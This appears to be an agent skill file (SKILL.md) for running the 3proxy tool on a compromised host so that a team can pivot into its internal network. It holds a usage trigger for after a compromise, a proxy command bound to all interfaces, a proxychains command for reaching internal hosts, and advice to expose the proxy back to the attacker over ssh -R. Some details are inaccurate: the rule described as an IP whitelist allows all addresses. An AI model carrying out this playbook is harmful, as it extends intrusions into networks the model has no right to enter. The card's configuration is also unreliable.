---
name: 3proxy-pivot
description: "3proxy: starts a secondary proxy on a compromised host for team use. Signals: network tunneling, tunnel, SOCKS5, IP whitelist only"
zh-signals: "3proxy: 已控主机上起二级代理供全组使用。信号:内网穿透,隧道,SOCKS5,仅按 IP 白名单放行。"
when-to-use: >-
  Use after compromising a host when you need to stand up an HTTP/SOCKS5 proxy
  on it so the whole team can pivot into the internal network.
---

# 3proxy

- Attack Category: C32 Tunneling and Internal Network Pivoting
- Upstream Repository: https://github.com/3proxy/3proxy
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/3proxy/3proxy && make -f Makefile.Linux
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `proxy -p3128 -i0.0.0.0 -e0.0.0.0` | Start HTTP/SOCKS proxy |
| `socks -p1080` | SOCKS5 |
| `auth iponly / allow * * * *` | Allow only whitelisted IPs |

## Attack Scenario Playbook

### Stand Up a Secondary Proxy on a Compromised Host for the Whole Team

```bash
./3proxy proxy -p3128 -i0.0.0.0 -e0.0.0.0 &
# attacker machine: proxychains curl http://internal-IP/
```

## Notes

Tiny C proxy that works on both Windows and Linux; pair it with ssh -R to reverse-expose it to the attacker machine.
